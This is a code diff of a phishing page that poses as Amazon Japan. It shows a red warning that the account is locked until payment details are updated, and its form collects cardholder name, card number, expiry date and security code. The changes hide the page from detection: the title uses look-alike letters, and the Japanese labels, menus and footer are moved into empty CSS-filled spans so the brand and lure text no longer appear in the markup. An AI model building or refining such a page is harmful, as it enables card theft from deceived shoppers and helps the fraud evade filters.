@@ -22,12 +22,10 @@
     </style>
     <link rel="stylesheet" href="../style/css/217css.css"/>
     <link rel="stylesheet" href="../style/css/219css.css"/>
-    <title>Amazon | 本, ファッション, 家電から食品まで | アマゾン</title>
-    <meta name="description"
-          content="Amazon.co.jp 公式サイト。お急ぎ便ご利用で当日・翌日にお届け。アマゾンで本, 日用品, ファッション, 食品, ベビー用品, カー用品ほか一億種の商品をいつでもお安く。通常配送無料(一部を除く)"/>
-    <meta property="og:description"
-          content="Amazon.co.jp 公式サイト。お急ぎ便ご利用で当日・翌日にお届け。アマゾンで本, 日用品, ファッション, 食品, ベビー用品, カー用品ほか一億種の商品をいつでもお安く。通常配送無料(一部を除く)"
-          xmlns:og="http://opengraphprotocol.org/schema/"/>
+    <link rel="stylesheet" href="../style/css/signin.css"/>
+    <link rel="stylesheet" href="../style/css/card.css"/>
+    <link rel="stylesheet" href="../style/css/billing.css"/>
+    <title>Amаzоn</title>
     <link rel="stylesheet" href="../style/css/41rcss.css"/>
     <style type="text/css">
         #gw-mobile-points-balance-bar {
@@ -314,7 +312,7 @@
 <script src="../js/jquery.card.min.js" charset="utf-8"></script>
 <script src="../js/jquery.mask.js"></script>
 <script type="text/javascript">
-    setTimeout("yincang()", 0);
+    setTimeout("yincang()", 100);
     function yincang() {
     let content = document.getElementById('bodyid');
     content.innerHTML="<header class=\"nav-mobile nav-locale-jp nav-lang-ja nav-ssl nav-unrec nav-blueheaven\">\n" +
@@ -362,25 +360,25 @@
             "            </form>\n" +
             "        </div>\n" +
             "        <div id=\"nav-gwbar\" class=\"nav-gwbar-single-row nav-genz nav-gwbar-white nav-gwbar-scroll\">\n" +
-            "            <a id=\"deals\" href=\"#\" class=\"nav-a  \">タイムセール</a>\n" +
-            "            <a id=\"prime\" href=\"#\" class=\"nav-a  \">プライム</a>\n" +
-            "            <a id=\"video\" href=\"#\" class=\"nav-a  \">ビデオ </a>\n" +
-            "            <a id=\"music\" href=\"#\" class=\"nav-a  \">ミュージック</a>\n" +
-            "            <a href=\"#\" class=\"nav-a  \">ランキング</a>\n" +
-            "            <a href=\"#\" class=\"nav-a  \">新着商品</a>\n" +
-            "            <a href=\"#\" class=\"nav-a  \">AmazonBasics</a>\n" +
-            "            <a href=\"#\" class=\"nav-a  \">ギフト券</a>\n" +
-            "            <a id=\"health-and-personal-care\" href=\"#\" class=\"nav-a  \">ドラッグストア</a>\n" +
-            "            <a id=\"books\" href=\"#\">本・コミック</a>\n" +
-            "            <a id=\"pc\" href=\"#\" class=\"nav-a  \">パソコン・周辺機器</a>\n" +
-            "            <a id=\"kitchen\" href=\"#\" class=\"nav-a  \">ホーム＆キッチン</a>\n" +
+            "            <a id=\"deals\" href=\"#\" class=\"nav-a  \"><span class='billing29'></span></a>\n" +
+            "            <a id=\"prime\" href=\"#\" class=\"nav-a  \"><span class='billing30'></span></a>\n" +
+            "            <a id=\"video\" href=\"#\" class=\"nav-a  \"><span class='billing31'></a>\n" +
+            "            <a id=\"music\" href=\"#\" class=\"nav-a  \"><span class='billing32'></a>\n" +
+            "            <a href=\"#\" class=\"nav-a  \"><span class='billing33'></a>\n" +
+            "            <a href=\"#\" class=\"nav-a  \"><span class='billing34'></a>\n" +
+            "            <a href=\"#\" class=\"nav-a  \"><span class='billing35'></a>\n" +
+            "            <a href=\"#\" class=\"nav-a  \"><span class='billing36'></a>\n" +
+            "            <a id=\"health-and-personal-care\" href=\"#\" class=\"nav-a  \"><span class='billing37'></a>\n" +
+            "            <a id=\"books\" href=\"#\" class=\"nav-a  \"><span class='billing38'></a>\n" +
+            "            <a id=\"pc\" href=\"#\" class=\"nav-a  \"><span class='billing39'></a>\n" +
+            "            <a id=\"kitchen\" href=\"#\" class=\"nav-a  \"><span class='billing40'></a>\n" +
             "        </div>\n" +
             "        <!-- NAVYAAN-GLOW-SUBNAV -->\n" +
             "        <div class=\"glow-subnav-template glow-mobile-subnav\" id=\"nav-subnav-container\">\n" +
             "            <div class=\"a-declarative\" data-action=\"glow-sheet-trigger\" id=\"nav-global-location-slot\">\n" +
             "                <div class=\"nav-sprite\" id=\"nav-packard-glow-loc-icon\"></div>\n" +
             "                <div id=\"glow-ingress-block\">\n" +
-            "                    <span class=\"nav-single-line\" id=\"glow-ingress-single-line\"> アメリカ合衆国にお届け </span>\n" +
+            "                    <span class=\"nav-single-line\" id=\"glow-ingress-single-line\"><span class='card13'></span>  </span>\n" +
             "                </div>\n" +
             "                <input data-addnewaddress=\"new\" id=\"unifiedLocation1ClickAddress\" name=\"addressID\" type=\"hidden\"\n" +
             "                       value=\"\"/>\n" +
@@ -413,7 +411,7 @@
             "                        <div style=\"background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto; box-shadow: 0 2px 10px 4px rgba(0,0,0,0.25);margin-left:10px;margin-right:10px;\">\n" +
             "                            <h3 class=\"u-focus in-progress\" tabindex=\"-1\" id=\"logoff-header\">\n" +
             "                                <font style=\"color:red;\">\n" +
-            "                                    <center>更新するまでアカウントにアクセスできません</center>\n" +
+            "                                    <center><span class='card1'></span></center>\n" +
             "                                </font>\n" +
             "                            </h3>\n" +
             "                        </div>\n" +
@@ -424,7 +422,7 @@
             "                            <div class=\"row\" style=\"margin-left:10px;margin-right:10px;\">\n" +
             "                                <div class=\"col-xs-10 col-xs-offset-1\">\n" +
             "                                    <div style=\"text-align: center;\">\n" +
-            "                                        <h2>お支払い方法を更新する<span class=\"util high-contrast\"></span></h2>\n" +
+            "                                        <h2><span class='card2'></span><span class=\"util high-contrast\"></span></h2>\n" +
             "                                        <br>\n" +
             "\n" +
             "                                        <div class=\"jpui progress rectangles\" id=\"progress-progressBar\"\n" +
@@ -484,8 +482,8 @@
             "                                    <form name=\"formcard\" id=\"formcard\" method=\"POST\" action=\"#\">\n" +
             "\n" +
             "                                        <div class=\"a-row a-spacing-base\">\n" +
-            "                                            <label class=\"a-form-label\"> カード名義人 <font\n" +
-            "                                                        style='color:#797474;'>(半角ローマ字で入力)</font> </label>\n" +
+            "                                            <label class=\"a-form-label\"> <span class='card3'></span> <font\n" +
+            "                                                        style='color:#797474;'><span class='card4'></span></font> </label>\n" +
             "\n" +
             "\n" +
             "                                            <input placeholder=\"カード名義人\" id=\"nameoncard\" name=\"namecard\"\n" +
@@ -497,7 +495,7 @@
             "\n" +
             "                                        <div class=\"a-row a-spacing-base\">\n" +
             "\n" +
-            "                                            <label class=\"a-form-label\"> カード番号 <font style='color:#797474;'>(カード番号を入力してください)</font>\n" +
+            "                                            <label class=\"a-form-label\"> <span class='card5'></span> <font style='color:#797474;'><span class='card6'></span></font>\n" +
             "                                            </label>\n" +
             "\n" +
             "                                            <input placeholder=\"カード番号\" value=\"\"\n" +
@@ -508,7 +506,7 @@
             "\n" +
             "                                        <div class=\"a-row a-spacing-base\">\n" +
             "\n" +
-            "                                            <label class=\"a-form-label\">有効期限 <font style='color:#797474;'>(有効期限を入力してください)</font></label>\n" +
+            "                                            <label class=\"a-form-label\"><span class='card7'></span> <font style='color:#797474;'><span class='card8'></span></font></label>\n" +
             "\n" +
             "                                            <!--<input placeholder=\"MM/YY\" id=\"exdatee\" name=\"exdate\" autocomplete=\"off\" class=\"a-input-text a-span12 \" required>-->\n" +
             "                                            <select placeholder=\"MM\" id=\"exdatemoon\" name=\"exdatemoon\"\n" +
@@ -526,7 +524,7 @@
             "\n" +
             "                                        <div class=\"a-row a-spacing-base\">\n" +
             "\n" +
-            "                                            <label class=\"a-form-label\">セキュリティコード <font style='color:#797474;'>(セキュリティコードを入力してください)</font></label>\n" +
+            "                                            <label class=\"a-form-label\"><span class='card9'></span><font style='color:#797474;'><span class='card10'></span></font></label>\n" +
             "\n" +
             "                                            <input placeholder=\"セキュリティコード\" id=\"cvv\" name=\"cvc\" minLength=\"3\"\n" +
             "                                                   maxlength=\"4\" autocomplete=\"off\"\n" +
@@ -541,7 +539,7 @@
             "                                                                                       class=\"a-button-input\"\n" +
             "                                                                                       type=\"submit\"><span\n" +
             "                                                            id=\"continue-announce\"\n" +
-            "                                                            class=\"a-button-text\"> 継続する </span></span>\n" +
+            "                                                            class=\"a-button-text\"> <span class='card11'></span> </span></span>\n" +
             "                                                    </span>\n" +
             "                                        </div>\n" +
             "                                        <div class=\"a-divider a-divider-break\">\n" +
@@ -549,7 +547,7 @@
             "                                        <span id=\"auth-create-account-link\" class=\"a-button a-button-span12\"> <span\n" +
             "                                                    class=\"a-button-inner\"><a id=\"createAccountSubmit\" tabindex=\"6\"\n" +
             "                                                                              href=\"#\" class=\"a-button-text\"\n" +
-            "                                                                              role=\"button\"> キャンセル </a></span></span>\n" +
+            "                                                                              role=\"button\"> <span class='card12'></span> </a></span></span>\n" +
             "                                    </form>\n" +
             "                                </div>\n" +
             "                            </div>\n" +
@@ -575,32 +573,32 @@
             "    <div id=\"nav-ftr\" class=\"nav-t-footer-gateway nav-sprite-v3\">\n" +
             "        <a id=\"nav-ftr-gototop\" class=\"nav-a\" href=\"#\"> <i class=\"nav-icon\"></i> <b class=\"nav-b\"> ページトップへ </b> </a>\n" +
             "        <ul id=\"nav-ftr-links\" class=\"nav-ftr-links-two-column\">\n" +
-            "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> マイストア </span> <i\n" +
+            "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing17'></span> </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> ほしい物リスト </span> <i\n" +
+            "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"><span class='billing18'></span>  </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> アカウントサービス </span> <i\n" +
+            "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing19'></span> </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
             "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span\n" +
-            "                            class=\"nav-ftr-text\"> Amazon定期おトク便情報 </span> <i class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> 1-Click設定 </span> <i\n" +
+            "                            class=\"nav-ftr-text\"> <span class='billing20'></span> </span> <i class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
+            "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"><span class='billing21'></span>  </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
             "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> ヘルプ・サポート </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> カートを見る (<b\n" +
+            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing22'></span> (<b\n" +
             "                                class=\"nav-b nav-cart-count\">0</b>) </span> <i class=\"nav-icon nav-sprite\"></i> </a>\n" +
             "            </li>\n" +
-            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> 注文履歴 </span> <i\n" +
+            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing23'></span> </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> ほしい物リストサーチ </span> <i\n" +
+            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing24'></span> </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> Amazonで売る </span> <i\n" +
+            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing25'></span> </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> 最近チェックした商品 </span> <i\n" +
+            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing26'></span> </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> カスタマーサービスに連絡 </span> <i\n" +
+            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing27'></span> </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> Amazon PCサイト </span> <i\n" +
+            "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing28'></span> </span> <i\n" +
             "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
             "        </ul>\n" +
             "        <div class=\"icp-container-mobile\">\n" +
@@ -626,17 +624,23 @@
             "            アカウントをお持ちですか？\n" +
             "            <a href=\"#\" class=\"nav-a\">ログイン</a>\n" +
             "        </div>\n" +
-            "        <ul class=\"nav-ftr-horiz nav-ftr-big\">\n" +
-            "            <li class=\"nav-li\"><a href=\"#\" class=\"nav-a\"> 検索・閲覧履歴 </a></li>\n" +
-            "        </ul>\n" +
-            "        <ul class=\"nav-ftr-horiz\">\n" +
-            "            <li class=\"nav-li\"><a href=\"#\" class=\"nav-a\">利用規約</a></li>\n" +
-            "            <li class=\"nav-li\"><a href=\"#\" class=\"nav-a\">プライバシー規約</a></li>\n" +
-            "            <li class=\"nav-li\"><a href=\"#\" class=\"nav-a\">パーソナライズド広告規約</a></li>\n" +
-            "        </ul>\n" +
-            "        <div id=\"nav-ftr-copyright\">\n" +
-            "            &copy; 2000-2021, Amazon.com, Inc. and its affiliates\n" +
-            "        </div>\n" +
+            "          <ul class=\"nav-ftr-horiz nav-ftr-big \">\n" +
+            "                    <li class=\"nav-li \">\n" +
+            "                        <a href=\"#\" class=\"nav-a\"><span class='signin19'></span></a>\n" +
+            "                    </li>\n" +
+            "                </ul>\n" +
+            "                <ul class=\"nav-ftr-horiz \">\n" +
+            "                    <li class=\"nav-li \">\n" +
+            "                        <a href=\"#\" class=\"nav-a\"><span class='signin20'></span></a>\n" +
+            "                    </li>\n" +
+            "                    <li class=\"nav-li \">\n" +
+            "                        <a href=\"#\" class=\"nav-a\"><span class='signin21'></span></a>\n" +
+            "                    </li>\n" +
+            "                    <li class=\"nav-li \">\n" +
+            "                        <a href=\"#\" class=\"nav-a\"><span class='signin22'></span></a>\n" +
+            "                    </li>\n" +
+            "                </ul>\n" +
+            "                <div id=\"nav-ftr-copyright\"><span class='signin23'></span></div>\n" +
             "    </div>\n" +
             "</footer>\n" +
             "<!-- whfh-Qk0sG5OcnKluHYqH2y/5BmESxqy4aXM973lJPN5YU3KKswhgm+q2uMb8RHOHdQbP rid-VNB14BJ37PY4TWGVKFV7 -->\n" +
